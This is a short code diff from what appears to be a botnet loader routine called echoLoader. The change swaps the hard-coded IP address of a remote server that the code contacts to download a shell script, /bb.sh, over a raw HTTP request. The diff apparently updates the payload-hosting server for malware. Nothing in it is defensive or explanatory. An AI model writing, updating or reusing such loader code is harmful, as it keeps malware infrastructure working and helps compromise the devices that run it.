@@ -272,7 +272,7 @@ void echoLoader() {
     FILE *f;
 
     // Connect to server
-    fd = s_connect("https://31.58.58.115", 80);
+    fd = s_connect("https://31.56.39.249", 80);
     if (fd < 0) {
         printf("Connection failed\n");
         return;
@@ -281,7 +281,7 @@ void echoLoader() {
     // Build a valid HTTP GET request
     const char *http_request = 
         "GET /bb.sh HTTP/1.1\r\n"
-        "Host: https://31.58.58.115\r\n"
+        "Host: https://31.56.39.249\r\n"
         "Connection: close\r\n"
         "\r\n";
 
